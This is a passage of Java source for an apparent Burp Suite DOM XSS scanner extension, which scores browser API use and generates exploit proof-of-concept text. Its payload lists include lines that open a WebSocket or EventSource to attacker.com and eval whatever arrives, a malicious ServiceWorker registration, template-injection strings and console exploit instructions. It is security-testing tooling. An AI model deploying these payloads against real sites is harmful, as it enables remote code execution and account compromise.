                "new\\s+BroadcastChannel\\s*\\(|BroadcastChannel\\s*\\(|broadcastChannel\\.postMessage",
                Pattern.CASE_INSENSITIVE
            );
            if (bcUsagePattern.matcher(html).find()) {
                analysis.setHasBroadcastChannel(true);
                analysis.setBroadcastChannelRisk("MEDIUM");
                analysis.getRealTimeVectors().add("BroadcastChannel");
                callbacks.printOutput("[REALTIME] BroadcastChannel detected with usage - Cross-tab communication active");
            }
        }
        
        // DYNAMIC IMPORT DETECTION - Enhanced with regex patterns
        Pattern dynamicImportPattern = Pattern.compile(
            "import\\s*\\(|dynamic\\s+import|import\\.meta",
            Pattern.CASE_INSENSITIVE
        );
        if (dynamicImportPattern.matcher(html).find()) {
            // Check for actual dynamic import usage (not static import)
            Pattern diUsagePattern = Pattern.compile(
                "import\\s*\\([^)]+\\)|import\\.meta\\.url|import\\.meta\\.resolve",
                Pattern.CASE_INSENSITIVE
            );
            if (diUsagePattern.matcher(html).find()) {
                analysis.setHasDynamicImport(true);
                analysis.setDynamicImportRisk("HIGH");
                analysis.getRealTimeVectors().add("DynamicImport");
                callbacks.printOutput("[REALTIME] Dynamic Import detected with usage - Runtime module loading active");
            }
        }
        
        // SHARED ARRAY BUFFER DETECTION - Enhanced with regex patterns
        Pattern sharedArrayBufferPattern = Pattern.compile(
            "(?:new\\s+)?SharedArrayBuffer\\s*\\(|sharedarraybuffer|shared\\s*array\\s*buffer",
            Pattern.CASE_INSENSITIVE
        );
        if (sharedArrayBufferPattern.matcher(html).find()) {
            // Check for actual usage
            Pattern sabUsagePattern = Pattern.compile(
                "new\\s+SharedArrayBuffer\\s*\\(|SharedArrayBuffer\\s*\\(|Atomics\\.(?:load|store|exchange)",
                Pattern.CASE_INSENSITIVE
            );
            if (sabUsagePattern.matcher(html).find()) {
                analysis.setHasSharedArrayBuffer(true);
                analysis.setSharedArrayBufferRisk("HIGH");
                analysis.getRealTimeVectors().add("SharedArrayBuffer");
                callbacks.printOutput("[REALTIME] SharedArrayBuffer detected with usage - Shared memory active");
            }
        }
        
        // WEBASSEMBLY DETECTION - Enhanced with regex patterns
        Pattern webAssemblyPattern = Pattern.compile(
            "WebAssembly\\.(?:instantiate|compile|validate)|webassembly|wasm|\\.wasm",
            Pattern.CASE_INSENSITIVE
        );
        if (webAssemblyPattern.matcher(html).find()) {
            // Check for actual WebAssembly usage
            Pattern wasmUsagePattern = Pattern.compile(
                "WebAssembly\\.instantiate\\s*\\(|WebAssembly\\.compile\\s*\\(|fetch\\s*\\([^)]*\\.wasm",
                Pattern.CASE_INSENSITIVE
            );
            if (wasmUsagePattern.matcher(html).find()) {
                analysis.setHasWebAssembly(true);
                analysis.setWebAssemblyRisk("HIGH");
                analysis.getRealTimeVectors().add("WebAssembly");
                callbacks.printOutput("[REALTIME] WebAssembly detected with usage - Native code execution active");
            }
        }
        
        // REQUEST ANIMATION FRAME DETECTION
        if (htmlLower.contains("requestanimationframe") || htmlLower.contains("requestanimationframe")) {
            analysis.setHasRequestAnimationFrame(true);
            analysis.setRequestAnimationFrameRisk("MEDIUM");
            analysis.getRealTimeVectors().add("RequestAnimationFrame");
            callbacks.printOutput("[REALTIME] RequestAnimationFrame detected - Animation loop possible");
        }
        
        // PROMISE/ASYNC DETECTION
        if (htmlLower.contains("promise") || htmlLower.contains("async") || htmlLower.contains("await")) {
            analysis.setHasPromiseAsync(true);
            analysis.setPromiseAsyncRisk("MEDIUM");
            analysis.getRealTimeVectors().add("PromiseAsync");
            callbacks.printOutput("[REALTIME] Promise/Async detected - Asynchronous execution possible");
        }
        
        // PROXY DETECTION
        if (htmlLower.contains("proxy") || htmlLower.contains("new proxy")) {
            analysis.setHasProxy(true);
            analysis.setProxyRisk("HIGH");
            analysis.getRealTimeVectors().add("Proxy");
            callbacks.printOutput("[REALTIME] Proxy detected - Object interception possible");
        }
        
        // REFLECT API DETECTION
        if (htmlLower.contains("reflect.") || htmlLower.contains("reflect api")) {
            analysis.setHasReflectAPI(true);
            analysis.setReflectAPIRisk("MEDIUM");
            analysis.getRealTimeVectors().add("ReflectAPI");
            callbacks.printOutput("[REALTIME] Reflect API detected - Meta-programming possible");
        }
        
        // OBSERVER API DETECTION
        if (htmlLower.contains("resizeobserver") || htmlLower.contains("intersectionobserver") || htmlLower.contains("performanceobserver")) {
            analysis.setHasObserverAPI(true);
            analysis.setObserverAPIRisk("MEDIUM");
            analysis.getRealTimeVectors().add("ObserverAPI");
            callbacks.printOutput("[REALTIME] Observer API detected - Event monitoring possible");
        }
        
        // Calculate real-time risk score
        int realTimeRiskScore = calculateRealTimeRiskScore(analysis);
        analysis.setRealTimeRiskScore(realTimeRiskScore);
        
        return analysis;
    }
    
    /**
     * Calculate real-time risk score based on detected vectors
     */
    private int calculateRealTimeRiskScore(RealTimeDynamicAnalysis analysis) {
        int score = 0;
        
        if (analysis.isHasMutationObserver()) score += 25;
        if (analysis.isHasWebSocket()) score += 30;
        if (analysis.isHasEventSource()) score += 20;
        if (analysis.isHasServiceWorker()) score += 25;
        if (analysis.isHasWebWorker()) score += 15;
        if (analysis.isHasBroadcastChannel()) score += 15;
        if (analysis.isHasDynamicImport()) score += 25;
        if (analysis.isHasSharedArrayBuffer()) score += 30;
        if (analysis.isHasWebAssembly()) score += 35;
        if (analysis.isHasRequestAnimationFrame()) score += 10;
        if (analysis.isHasPromiseAsync()) score += 10;
        if (analysis.isHasProxy()) score += 20;
        if (analysis.isHasReflectAPI()) score += 15;
        if (analysis.isHasObserverAPI()) score += 10;
        
        return Math.min(score, 100);
    }
    
    /**
     * Generate real-time dynamic payloads based on detected vectors
     */
    private List<String> generateRealTimeDynamicPayloads(RealTimeDynamicAnalysis analysis) {
        List<String> payloads = new ArrayList<>();
        
        if (analysis.isHasMutationObserver()) {
            payloads.add("<script>new MutationObserver(()=>alert('REALTIME_MUTATION')).observe(document,{childList:true,subtree:true})</script>");
            payloads.add("<script>new MutationObserver(mutations=>eval('alert(\"REALTIME_MUTATION\")')).observe(document.body,{attributes:true})</script>");
        }
        
        if (analysis.isHasWebSocket()) {
            payloads.add("<script>const ws=new WebSocket('ws://attacker.com');ws.onmessage=e=>eval(e.data);ws.send('alert(\"REALTIME_WS\")')</script>");
        }
        
        if (analysis.isHasEventSource()) {
            payloads.add("<script>const evtSource=new EventSource('https://attacker.com/events');evtSource.onmessage=e=>eval(e.data)</script>");
        }
        
        if (analysis.isHasServiceWorker()) {
            payloads.add("<script>navigator.serviceWorker.register('data:application/javascript,self.onmessage=e=>eval(e.data)').then(sw=>sw.active.postMessage('alert(\"REALTIME_SW\")'))</script>");
        }
        
        if (analysis.isHasDynamicImport()) {
            payloads.add("<script>import('data:text/javascript,alert(\"REALTIME_DI\")')</script>");
        }
        
        if (analysis.isHasWebAssembly()) {
            payloads.add("<script>WebAssembly.instantiate(new Uint8Array([0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00])).then(()=>alert('REALTIME_WASM'))</script>");
        }
        
        return payloads;
    }
    
    /**
     * Detect DOM Sources with Context
     */
    private List<DOMSource> detectDOMSources(String html) {
        List<DOMSource> sources = new ArrayList<>();
        String htmlLower = html.toLowerCase();
        
        for (String source : DOM_SOURCES) {
            if (htmlLower.contains(source.toLowerCase())) {
                // Find all occurrences
                Pattern pattern = Pattern.compile(Pattern.quote(source), Pattern.CASE_INSENSITIVE);
                Matcher matcher = pattern.matcher(html);
                
                while (matcher.find()) {
                    DOMSource domSource = new DOMSource();
                    domSource.setName(source);
                    domSource.setPosition(matcher.start());
                    domSource.setContext(extractContext(html, matcher.start(), 100));
                    domSource.setRiskLevel(calculateSourceRisk(source));
                    sources.add(domSource);
                }
            }
        }
        
        return sources;
    }
    
    /**
     * Detect DOM Sinks with Context
     */
    private List<DOMSink> detectDOMSinks(String html) {
        List<DOMSink> sinks = new ArrayList<>();
        String htmlLower = html.toLowerCase();
        
        for (String sink : DOM_SINKS) {
            if (htmlLower.contains(sink.toLowerCase())) {
                // Find all occurrences
                Pattern pattern = Pattern.compile(Pattern.quote(sink), Pattern.CASE_INSENSITIVE);
                Matcher matcher = pattern.matcher(html);
                
                while (matcher.find()) {
                    DOMSink domSink = new DOMSink();
                    domSink.setName(sink);
                    domSink.setPosition(matcher.start());
                    domSink.setContext(extractContext(html, matcher.start(), 100));
                    domSink.setRiskLevel(calculateSinkRisk(sink));
                    sinks.add(domSink);
                }
            }
        }
        
        return sinks;
    }
    
    /**
     * Detect JavaScript Frameworks
     */
    private List<String> detectFrameworks(String html) {
        List<String> frameworks = new ArrayList<>();
        String htmlLower = html.toLowerCase();
        
        for (Map.Entry<String, String[]> entry : FRAMEWORK_PATTERNS.entrySet()) {
            String framework = entry.getKey();
            String[] patterns = entry.getValue();
            
            for (String pattern : patterns) {
                if (htmlLower.contains(pattern.toLowerCase())) {
                    frameworks.add(framework);
                    break;
                }
            }
        }
        
        return frameworks;
    }
    
    /**
     * Analyze Data Flow between Sources and Sinks
     */
    private List<DataFlow> analyzeDataFlow(List<DOMSource> sources, List<DOMSink> sinks, String html) {
        List<DataFlow> dataFlows = new ArrayList<>();
        
        for (DOMSource source : sources) {
            for (DOMSink sink : sinks) {
                // Check if there's a potential data flow
                if (isPotentialDataFlow(source, sink, html)) {
                    DataFlow flow = new DataFlow();
                    flow.setSource(source);
                    flow.setSink(sink);
                    flow.setRiskLevel(calculateFlowRisk(source, sink));
                    flow.setExploitPayload(generateFlowPayload(source, sink));
                    dataFlows.add(flow);
                }
            }
        }
        
        return dataFlows;
    }
    
    /**
     * Generate Context-Specific Real Exploit POC
     */
    /**
     * Generate Real Exploit POC - FIXED: Prevent OutOfMemoryError with size limits
     */
    private String generateRealExploitPOC(DOMXSSResult result, IHttpRequestResponse requestResponse) {
        try {
            StringBuilder poc = new StringBuilder();
            
            // CRITICAL FIX: Limit size to prevent OutOfMemoryError
            final int MAX_POC_SIZE = 100000; // 100KB limit
            final int MAX_DATA_FLOWS = 10; // Limit data flows to prevent excessive generation
            final int MAX_PAYLOAD_LENGTH = 500; // Limit payload length in POC
            
            String targetUrl = requestResponse.getHttpService().getProtocol() + "://" + 
                              requestResponse.getHttpService().getHost() + ":" + 
                              requestResponse.getHttpService().getPort() + 
                              helpers.analyzeRequest(requestResponse).getUrl().getPath();
            
            poc.append("DOM XSS Vulnerability Detected\n");
            poc.append("Target URL: ").append(targetUrl).append("\n");
            poc.append("Vulnerability Score: ").append(result.getVulnerabilityScore()).append("%\n");
            poc.append("Risk Level: ").append(result.getRiskLevel()).append("\n");
            poc.append("Confidence: ").append(result.getConfidenceLevel()).append("\n\n");
            
            poc.append("Context-Specific Exploit Code\n");
            
            // Generate context-specific exploits for each data flow - WITH LIMITS
            int flowCount = 0;
            List<DataFlow> dataFlows = result.getDataFlows();
            if (dataFlows == null || dataFlows.isEmpty()) {
                poc.append("// No data flows detected\n");
            } else {
                // CRITICAL: Limit number of flows to prevent memory issues
                int flowsToProcess = Math.min(dataFlows.size(), MAX_DATA_FLOWS);
                for (int i = 0; i < flowsToProcess; i++) {
                    DataFlow flow = dataFlows.get(i);
                    if (flow == null) continue;
                    
                    // CRITICAL: Check size limit before processing
                    if (poc.length() > MAX_POC_SIZE) {
                        poc.append("\n// ... (POC truncated to prevent memory issues)\n");
                        break;
                    }
                    
                    // CRITICAL: Truncate payload if too long or null
                    String exploitPayload = flow.getExploitPayload();
                    if (exploitPayload == null) {
                        exploitPayload = "<script>alert('XSS')</script>";
                    }
                    if (exploitPayload.length() > MAX_PAYLOAD_LENGTH) {
                        exploitPayload = exploitPayload.substring(0, MAX_PAYLOAD_LENGTH) + "...";
                    }
                
                poc.append("// Context-Specific Exploit: ").append(flow.getSource().getName()).append(" -> ").append(flow.getSink().getName()).append("\n");
                poc.append("// Risk Level: ").append(flow.getRiskLevel()).append("\n");
                poc.append("// Payload: ").append(exploitPayload).append("\n");
                poc.append("var domExploit").append(flowCount).append(" = {\n");
                poc.append("    target: '").append(targetUrl).append("',\n");
                poc.append("    source: '").append(flow.getSource().getName()).append("',\n");
                poc.append("    sink: '").append(flow.getSink().getName()).append("',\n");
                poc.append("    payload: '").append(exploitPayload.replace("'", "\\'").replace("\n", "\\n").replace("\r", "\\r")).append("',\n");
                poc.append("    method: 'DOM XSS Exploit',\n");
                poc.append("    execute: function() {\n");
                poc.append("        // Method 1: Direct source injection\n");
                poc.append("        if (this.source.includes('location.hash')) {\n");
                poc.append("            location.hash = this.payload;\n");
                poc.append("        } else if (this.source.includes('location.search')) {\n");
                poc.append("            var url = new URL(window.location);\n");
                poc.append("            url.searchParams.set('param', this.payload);\n");
                poc.append("            window.location = url;\n");
                poc.append("        } else if (this.source.includes('document.referrer')) {\n");
                poc.append("            // Exploit via referrer manipulation\n");
                poc.append("            var referrer = document.referrer;\n");
                poc.append("            if (referrer) {\n");
                poc.append("                var refUrl = new URL(referrer);\n");
                poc.append("                refUrl.searchParams.set('param', this.payload);\n");
                poc.append("                document.referrer = refUrl.toString();\n");
                poc.append("            }\n");
                poc.append("        }\n");
                poc.append("        \n");
                poc.append("        // Method 2: Sink exploitation\n");
                poc.append("        if (this.sink.includes('innerHTML')) {\n");
                poc.append("            var element = document.getElementById('target');\n");
                poc.append("            if (element) {\n");
                poc.append("                element.innerHTML = this.payload;\n");
                poc.append("            }\n");
                poc.append("        } else if (this.sink.includes('eval')) {\n");
                poc.append("            eval(this.payload);\n");
                poc.append("        } else if (this.sink.includes('document.write')) {\n");
                poc.append("            document.write(this.payload);\n");
                poc.append("        }\n");
                poc.append("    }\n");
                poc.append("};\n\n");
                
                    // Generate specific exploit URLs - WITH LENGTH LIMITS
                    String safePayload = exploitPayload.length() > 100 ? exploitPayload.substring(0, 100) + "..." : exploitPayload;
                    // CRITICAL: Escape special characters in URL
                    safePayload = safePayload.replace("\n", "").replace("\r", "").replace("\t", "");
                    
                    poc.append("// Context-Specific Exploit URLs:\n");
                    poc.append("// URL Fragment: ").append(targetUrl).append("#").append(safePayload).append("\n");
                    poc.append("// Query Parameter: ").append(targetUrl).append("?param=").append(safePayload).append("\n");
                    poc.append("// Hash-based: ").append(targetUrl).append("#").append(safePayload).append("\n\n");
                    
                    flowCount++;
                    
                    // CRITICAL: Check size limit to prevent OutOfMemoryError
                    if (poc.length() > MAX_POC_SIZE) {
                        poc.append("\n// ... (POC truncated to prevent memory issues)\n");
                        break;
                    }
                }
                
                if (dataFlows.size() > MAX_DATA_FLOWS) {
                    poc.append("\n// ... (additional ").append(dataFlows.size() - MAX_DATA_FLOWS).append(" data flows omitted)\n");
                }
            }
            
            // Generate context-specific framework exploits - WITH LIMITS
            if (!result.getDetectedFrameworks().isEmpty() && poc.length() < MAX_POC_SIZE) {
                poc.append("\n=== Framework-Specific Exploits ===\n");
                int frameworkCount = 0;
                for (String framework : result.getDetectedFrameworks()) {
                    if (frameworkCount >= 5 || poc.length() > MAX_POC_SIZE) {
                        break;
                    }
                    poc.append("// Framework: ").append(framework).append("\n");
                    poc.append("var ").append(framework.toLowerCase()).append("Exploit = {\n");
                    poc.append("    target: '").append(targetUrl).append("',\n");
                    poc.append("    framework: '").append(framework).append("',\n");
                    poc.append("    method: '").append(framework).append(" DOM XSS',\n");
                    poc.append("    execute: function() {\n");
                    String frameworkExploit = generateFrameworkExploit(framework, targetUrl);
                    if (frameworkExploit.length() > 500) {
                        frameworkExploit = frameworkExploit.substring(0, 500) + "...";
                    }
                    poc.append("        ").append(frameworkExploit).append("\n");
                    poc.append("    }\n");
                    poc.append("};\n\n");
                    frameworkCount++;
                }
            }
            
            // CRITICAL: Add Real-Time Dynamic Exploitation Instructions
            RealTimeDynamicAnalysis realTimeAnalysis = result.getRealTimeAnalysis();
            if (realTimeAnalysis != null && realTimeAnalysis.hasRealTimeVectors() && poc.length() < MAX_POC_SIZE) {
                poc.append("\n=== Real-Time Dynamic Exploitation Instructions ===\n");
                poc.append("// These exploits target real-time vectors detected in the application\n\n");
                
                if (realTimeAnalysis.isHasMutationObserver()) {
                    poc.append("// 1. MutationObserver Exploitation:\n");
                    poc.append("// Step 1: Inject payload that triggers DOM mutation\n");
                    poc.append("// Step 2: MutationObserver will detect changes and execute payload\n");
                    poc.append("var mutationExploit = function() {\n");
                    poc.append("    const observer = new MutationObserver((mutations) => {\n");
                    poc.append("        mutations.forEach((mutation) => {\n");
                    poc.append("            if (mutation.addedNodes.length > 0) {\n");
                    poc.append("                mutation.addedNodes.forEach((node) => {\n");
                    poc.append("                    if (node.nodeType === 1 && node.innerHTML) {\n");
                    poc.append("                        eval(node.innerHTML);\n");
                    poc.append("                    }\n");
                    poc.append("                });\n");
                    poc.append("            }\n");
                    poc.append("        });\n");
                    poc.append("    });\n");
                    poc.append("    observer.observe(document.body, { childList: true, subtree: true, attributes: true });\n");
                    poc.append("    // Trigger mutation by injecting payload\n");
                    poc.append("    document.body.innerHTML += '<script>alert(\"MutationObserver XSS\")</script>';\n");
                    poc.append("};\n\n");
                }
                
                if (realTimeAnalysis.isHasWebSocket()) {
                    poc.append("// 2. WebSocket Exploitation:\n");
                    poc.append("// Step 1: Connect to WebSocket endpoint\n");
                    poc.append("// Step 2: Send malicious payload via WebSocket\n");
                    poc.append("// Step 3: Server echoes payload, triggering XSS\n");
                    poc.append("var websocketExploit = function() {\n");
                    poc.append("    const ws = new WebSocket('ws://' + window.location.host + '/ws');\n");
                    poc.append("    ws.onopen = function() {\n");
                    poc.append("        ws.send('<script>alert(\"WebSocket XSS\")</script>');\n");
                    poc.append("    };\n");
                    poc.append("    ws.onmessage = function(event) {\n");
                    poc.append("        document.body.innerHTML += event.data;\n");
                    poc.append("    };\n");
                    poc.append("};\n\n");
                }
                
                if (realTimeAnalysis.isHasServiceWorker()) {
                    poc.append("// 3. ServiceWorker Exploitation:\n");
                    poc.append("// Step 1: Register malicious ServiceWorker\n");
                    poc.append("// Step 2: ServiceWorker intercepts requests and injects payload\n");
                    poc.append("var serviceWorkerExploit = function() {\n");
                    poc.append("    navigator.serviceWorker.register('data:application/javascript,' + encodeURIComponent(\n");
                    poc.append("        'self.addEventListener(\"fetch\", e => {' +\n");
                    poc.append("        'e.respondWith(new Response(\"<script>alert(\\\"SW XSS\\\")</script>\"))' +\n");
                    poc.append("        '});'\n");
                    poc.append("    )).then(() => {\n");
                    poc.append("        console.log('ServiceWorker registered - XSS payload active');\n");
                    poc.append("    });\n");
                    poc.append("};\n\n");
                }
                
                if (realTimeAnalysis.isHasDynamicImport()) {
                    poc.append("// 4. Dynamic Import Exploitation:\n");
                    poc.append("// Step 1: Use dynamic import to load malicious code\n");
                    poc.append("// Step 2: Imported code executes in page context\n");
                    poc.append("var dynamicImportExploit = function() {\n");
                    poc.append("    import('data:text/javascript,alert(\"Dynamic Import XSS\")').then(() => {\n");
                    poc.append("        console.log('Dynamic import executed');\n");
                    poc.append("    });\n");
                    poc.append("};\n\n");
                }
                
                if (realTimeAnalysis.isHasWebAssembly()) {
                    poc.append("// 5. WebAssembly Exploitation:\n");
                    poc.append("// Step 1: Compile malicious WebAssembly module\n");
                    poc.append("// Step 2: Execute WebAssembly code that triggers XSS\n");
                    poc.append("var wasmExploit = function() {\n");
                    poc.append("    const wasmCode = new Uint8Array([0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00]);\n");
                    poc.append("    WebAssembly.instantiate(wasmCode).then(module => {\n");
                    poc.append("        eval('alert(\"WebAssembly XSS\")');\n");
                    poc.append("    });\n");
                    poc.append("};\n\n");
                }
                
                poc.append("// Execute all real-time exploits:\n");
                poc.append("// mutationExploit();\n");
                poc.append("// websocketExploit();\n");
                poc.append("// serviceWorkerExploit();\n");
                poc.append("// dynamicImportExploit();\n");
                poc.append("// wasmExploit();\n\n");
            }
            
            // Add comprehensive step-by-step exploitation guide
            if (poc.length() < MAX_POC_SIZE) {
                poc.append("\n=== Step-by-Step Dynamic Exploitation Guide ===\n");
                poc.append("1. Open browser Developer Tools (F12)\n");
                poc.append("2. Navigate to Console tab\n");
                poc.append("3. Copy and paste the exploit code above\n");
                poc.append("4. Execute the exploit function (e.g., domExploit0.execute())\n");
                poc.append("5. Observe XSS payload execution\n");
                poc.append("6. For real-time vectors, follow the specific instructions above\n");
                poc.append("7. Verify payload execution in browser console\n\n");
                
                poc.append("=== Manual Testing URLs ===\n");
                for (String payload : result.getSpecificPayloads()) {
                    if (poc.length() > MAX_POC_SIZE - 200) break;
                    String safePayload = payload.length() > 50 ? payload.substring(0, 50) + "..." : payload;
                    safePayload = safePayload.replace("\n", "").replace("\r", "").replace("\t", "");
                    poc.append("// Hash-based: ").append(targetUrl).append("#").append(safePayload).append("\n");
                    poc.append("// Query-based: ").append(targetUrl).append("?param=").append(safePayload).append("\n");
                }
            }
            
            // CRITICAL: Final size check
            if (poc.length() > MAX_POC_SIZE) {
                return poc.substring(0, MAX_POC_SIZE) + "\n// ... (truncated)";
            }
            
            return poc.toString();
            
        } catch (Exception e) {
            callbacks.printError("Error generating exploit POC: " + e.getMessage());
            return "Error generating exploit POC: " + e.getMessage();
        }
    }
    
    /**
     * Generate Context-Specific Reproduction Steps
     */
    private String generateReproductionSteps(DOMXSSResult result, IHttpRequestResponse requestResponse) {
        StringBuilder steps = new StringBuilder();
        
        String targetUrl = requestResponse.getHttpService().getProtocol() + "://" + 
                          requestResponse.getHttpService().getHost() + ":" + 
                          requestResponse.getHttpService().getPort() + 
                          helpers.analyzeRequest(requestResponse).getUrl().getPath();
        
        steps.append("Context-Specific Reproduction Steps\n");
        steps.append("URL: ").append(targetUrl).append("\n");
        steps.append("Method: DOM analysis\n");
        steps.append("Payloads: ").append(result.getSpecificPayloads().size()).append(" tested\n");
        steps.append("Data Flows: ").append(result.getDataFlows().size()).append(" detected\n");
        steps.append("Sources: ").append(result.getDetectedSources().size()).append(" found\n");
        steps.append("Sinks: ").append(result.getDetectedSinks().size()).append(" found\n\n");
        
        int stepNumber = 1;
        for (String payload : result.getSpecificPayloads()) {
            steps.append("Payload ").append(stepNumber++).append(":\n");
            steps.append("// ").append(payload).append("\n\n");
        }
        
        return steps.toString();
    }
    
    /**
     * Generate Context-Specific Source/Sink Analysis - FIXED: Prevent OutOfMemoryError
     */
    private String generateSourceSinkAnalysis(DOMXSSResult result) {
        try {
            StringBuilder analysis = new StringBuilder();
            
            // CRITICAL: Limit size to prevent OutOfMemoryError
            final int MAX_ANALYSIS_SIZE = 50000; // 50KB limit
            final int MAX_SOURCES = 20;
            final int MAX_SINKS = 20;
            
            analysis.append("Context-Specific Source/Sink Analysis\n");
            
            analysis.append("Detected DOM Sources:\n");
            List<DOMSource> sources = result.getDetectedSources();
            if (sources != null) {
                int sourceCount = 0;
                for (DOMSource source : sources) {
                    if (sourceCount >= MAX_SOURCES || analysis.length() > MAX_ANALYSIS_SIZE) {
                        analysis.append("// ... (additional sources omitted)\n");
                        break;
                    }
                    if (source == null) continue;
                    
                    String sourceName = source.getName();
                    if (sourceName != null && sourceName.length() > 200) {
                        sourceName = sourceName.substring(0, 200) + "...";
                    }
                    
                    analysis.append("Source: ").append(sourceName != null ? sourceName : "unknown").append("\n");
                    analysis.append("Risk Level: ").append(source.getRiskLevel() != null ? source.getRiskLevel() : "Unknown").append("\n");
                    String context = source.getContext();
                    if (context != null && context.length() > 200) {
                        context = context.substring(0, 200) + "...";
                    }
                    analysis.append("Context: ").append(context != null ? context : "Unknown").append("\n");
                    analysis.append("Position: ").append(source.getPosition()).append("\n\n");
                    sourceCount++;
                }
            }
            
            analysis.append("Detected DOM Sinks:\n");
            List<DOMSink> sinks = result.getDetectedSinks();
            if (sinks != null) {
                int sinkCount = 0;
                for (DOMSink sink : sinks) {
                    if (sinkCount >= MAX_SINKS || analysis.length() > MAX_ANALYSIS_SIZE) {
                        analysis.append("// ... (additional sinks omitted)\n");
                        break;
                    }
                    if (sink == null) continue;
                    
                    String sinkName = sink.getName();
                    if (sinkName != null && sinkName.length() > 200) {
                        sinkName = sinkName.substring(0, 200) + "...";
                    }
                    
                    analysis.append("Sink: ").append(sinkName != null ? sinkName : "unknown").append("\n");
                    analysis.append("Risk Level: ").append(sink.getRiskLevel() != null ? sink.getRiskLevel() : "Unknown").append("\n");
                    String sinkContext = sink.getContext();
                    if (sinkContext != null && sinkContext.length() > 200) {
                        sinkContext = sinkContext.substring(0, 200) + "...";
                    }
                    analysis.append("Context: ").append(sinkContext != null ? sinkContext : "Unknown").append("\n");
                    analysis.append("Position: ").append(sink.getPosition()).append("\n\n");
                    sinkCount++;
                }
            }
            
            // CRITICAL: Limit data flows to prevent memory issues
            analysis.append("Data Flows:\n");
            List<DataFlow> dataFlows = result.getDataFlows();
            if (dataFlows != null) {
                int flowCount = 0;
                final int MAX_FLOWS = 10;
                for (DataFlow flow : dataFlows) {
                    if (flowCount >= MAX_FLOWS || analysis.length() > MAX_ANALYSIS_SIZE) {
                        analysis.append("// ... (additional flows omitted)\n");
                        break;
                    }
                    if (flow == null || flow.getSource() == null || flow.getSink() == null) continue;
                    
                    String sourceName = flow.getSource().getName();
                    String sinkName = flow.getSink().getName();
                    if (sourceName != null && sourceName.length() > 200) sourceName = sourceName.substring(0, 200) + "...";
                    if (sinkName != null && sinkName.length() > 200) sinkName = sinkName.substring(0, 200) + "...";
                    
                    String exploitPayload = flow.getExploitPayload();
                    if (exploitPayload != null && exploitPayload.length() > 200) {
                        exploitPayload = exploitPayload.substring(0, 200) + "...";
                    }
                    
                    analysis.append("Flow: ").append(sourceName != null ? sourceName : "unknown").append(" -> ").append(sinkName != null ? sinkName : "unknown").append("\n");
                    analysis.append("Risk Level: ").append(flow.getRiskLevel() != null ? flow.getRiskLevel() : "Unknown").append("\n");
                    analysis.append("Exploit Payload: ").append(exploitPayload != null ? exploitPayload : "N/A").append("\n\n");
                    flowCount++;
                }
            }
            
            // CRITICAL: Final size check
            if (analysis.length() > MAX_ANALYSIS_SIZE) {
                return analysis.substring(0, MAX_ANALYSIS_SIZE) + "\n// ... (truncated)";
            }
            
            return analysis.toString();
        } catch (Exception e) {
            callbacks.printError("Error generating source/sink analysis: " + e.getMessage());
            return "Error generating source/sink analysis: " + e.getMessage();
        }
    }
    
    /**
     * CRITICAL FIX: Create real exploited evidence for DOM XSS attacks
     */
    private void createRealExploitedEvidence(DOMXSSResult result, IHttpRequestResponse requestResponse) {
        try {
            // Generate appropriate payload based on detected sources and sinks
            String payload = generateDOMXSSPayload(result);
            if (payload == null || payload.trim().isEmpty()) {
                payload = "#<script>alert('DOM_XSS')</script>";
            }
            
            // CRITICAL: For DOM XSS passive scanning, we analyze the actual response
            // We cannot send HTTP requests in passive scanning - that requires active scanning
            // Store the actual request/response as evidence
            try {
                // Use actual request/response from the server
                byte[] actualRequest = requestResponse.getRequest();
                byte[] actualResponse = requestResponse.getResponse();
                
                if (actualRequest != null && actualRequest.length > 0) {
                    result.setTestRequest(new String(actualRequest, StandardCharsets.UTF_8));
                }
                if (actualResponse != null && actualResponse.length > 0) {
                    result.setTestResponse(new String(actualResponse, StandardCharsets.UTF_8));
                }
                result.setTestPayload(payload);
                callbacks.printOutput("[DOM-XSS] Using actual request/response for evidence");
            } catch (Exception e) {
                callbacks.printError("[DOM-XSS] Error processing actual request/response: " + e.getMessage());
            }
            
        } catch (Exception e) {
            callbacks.printError("[DOM-XSS] Error creating exploited evidence: " + e.getMessage());
        }
    }
    
    /**
     * Generate appropriate payload for DOM XSS attacks
     */
    private String generateDOMXSSPayload(DOMXSSResult result) {
        // Generate payload based on detected sources and sinks
        if (!result.getDataFlows().isEmpty()) {
            DataFlow flow = result.getDataFlows().get(0);
            if (flow.getExploitPayload() != null && !flow.getExploitPayload().trim().isEmpty()) {
                return flow.getExploitPayload();
            }
        }
        
        // Generate payload based on detected sources
        if (!result.getDetectedSources().isEmpty()) {
            DOMSource source = result.getDetectedSources().get(0);
            if (source.getName().contains("location.hash")) {
                return "#<script>alert('DOM_XSS')</script>";
            } else if (source.getName().contains("location.search")) {
                return "?param=<script>alert('DOM_XSS')</script>";
            } else if (source.getName().contains("postMessage")) {
                return "<script>window.postMessage('<script>alert(1)</script>', '*')</script>";
            } else if (source.getName().contains("document.referrer")) {
                return "<script>alert('DOM_XSS')</script>";
            }
        }
        
        // Generate payload based on detected frameworks
        if (!result.getDetectedFrameworks().isEmpty()) {
            String framework = result.getDetectedFrameworks().get(0);
            if (framework.equals("Angular")) {
                return "{{constructor.constructor('alert(1)')()}}";
            } else if (framework.equals("Vue")) {
                return "${alert(1)}";
            } else if (framework.equals("React")) {
                return "<script>alert('DOM_XSS')</script>";
            }
        }
        
        // Default DOM XSS payload
        return "#<script>alert('DOM_XSS')</script>";
    }
    
    // REMOVED: createDOMXSSTestRequest() and createDOMXSSTestResponse() - These were creating synthetic/fake data
    // For passive scanning, we MUST use actual request/response from the server
    // For active scanning, we use actual HTTP requests via sendRealHttpRequest()
    
    /**
     * Generate Context-Specific Browser Exploit Code
     */
    private String generateBrowserExploitCode(DOMXSSResult result, IHttpRequestResponse requestResponse) {
        StringBuilder code = new StringBuilder();
        
        String targetUrl = requestResponse.getHttpService().getProtocol() + "://" + 
                          requestResponse.getHttpService().getHost() + ":" + 
                          requestResponse.getHttpService().getPort() + 
                          helpers.analyzeRequest(requestResponse).getUrl().getPath();
        
        code.append("Context-Specific Browser Exploit Code\n");
        code.append("// Copy and paste this code into browser console\n");
        code.append("// Target URL: ").append(targetUrl).append("\n\n");
        
        code.append("// ============================================\n");
        code.append("// COMPREHENSIVE DOM XSS DYNAMIC EXPLOITATION\n");
        code.append("// ============================================\n");
        code.append("// Copy and paste this entire code block into browser console\n");
        code.append("// Target URL: ").append(targetUrl).append("\n\n");
        
        code.append("// Function to test DOM XSS with all detected vectors\n");
        code.append("function testDOMXSS() {\n");
